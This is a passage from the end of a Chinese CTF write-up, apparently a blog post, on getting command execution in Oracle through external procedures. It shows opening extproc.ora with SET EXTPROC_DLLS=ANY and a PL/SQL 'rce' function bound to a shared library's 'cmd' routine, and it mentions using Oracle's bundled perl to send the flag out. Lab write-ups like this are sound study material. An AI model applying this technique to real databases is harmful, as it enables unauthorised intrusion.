<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702561336774-8d6dd01d-d37f-487e-93e5-b1e97e8e8b4f.png#averageHue=%232a2d32&clientId=uc0602720-8ce8-4&from=paste&height=752&id=u7959c7c8&originHeight=752&originWidth=1681&originalType=binary&ratio=1&rotation=0&showTitle=false&size=159302&status=done&style=none&taskId=u4b6b097f-8856-4bff-bbf7-9846617e005&title=&width=1681" alt="image.png"><br>这里其实还会遇到这个问题，也就是dll path，上述提到的问题，我不知道题目靶场的<code>$ORACLE_HOME/hs/admin/extproc.ora</code>里面设置的是什么，又或者是我的oracle版本过高（23c）导致的，低版本的oracle不需要设置这个？无论如何我现在需要修改一下文件内容<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702561497684-c70bc8f5-4890-4e83-9280-ee6206592a08.png#averageHue=%23030201&clientId=uc0602720-8ce8-4&from=paste&height=163&id=ud2653063&originHeight=163&originWidth=653&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11676&status=done&style=none&taskId=uec241284-78d2-41d8-a528-1be63278dec&title=&width=653" alt="image.png"><br>也可以把那个直接改为<code>SET EXTPROC_DLLS=ANY</code>直接开放，我估计题目靶场可能就是这么写的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702573155758-4170eef9-5b28-4692-8b32-49212bc3c2a3.png#averageHue=%232e2e2d&clientId=ua1cfb816-af10-4&from=paste&height=753&id=uc4f7b21e&originHeight=753&originWidth=1512&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80522&status=done&style=none&taskId=u48f69e06-1745-4430-9aa8-a7ea7cb8efe&title=&width=1512" alt="image.png"><br>在这一步并没出现xz师傅说到的不能执行&#x2F;bin目录下的指令，可能题目做了多余限制吧，假如有限制的话，那我们就只能用oracle根目录下的指令了，比如自带的perl，perl可以外带flag。</p>
<h2 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h2><p>我一直搞错那个lib的创建问题，问题出现在</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params">str varchar2</span>) <span class="title">return</span> <span class="title">varchar2</span> <span class="title">as</span> <span class="title">language</span> <span class="title">c</span> <span class="title">library</span> <span class="title">lib_evils</span> <span class="title">name</span> &quot;<span class="title">cmd</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这里的<code>name &quot;cmd&quot;</code>一定要和你so文件内的函数名字一样，这不是给这个function取名字，这部分通常用于在调用外部库的过程中指定要执行的函数或子例程的名称。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702573258880-648f7350-a0fb-41d1-aec9-da48e605b242.png#averageHue=%23fdfcfa&clientId=ua1cfb816-af10-4&from=paste&height=272&id=u928cacc5&originHeight=272&originWidth=818&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41519&status=done&style=none&taskId=u75e3c23f-dbd5-4b3e-a20e-89293009dff&title=&width=818" alt="image.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/Oracle/" class="tag">#Oracle</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/02/29/Ysoserial%20JRMPListener_Client%20Review/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Ysoserial JRMPListener/Client Review</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/02/29/BCEL%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8%E5%85%A8%E5%8F%8D%E5%B0%84%E6%9E%84%E9%80%A0%E9%AB%98%E5%8F%AF%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">BCEL环境下利用全反射构造高可用内存马</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>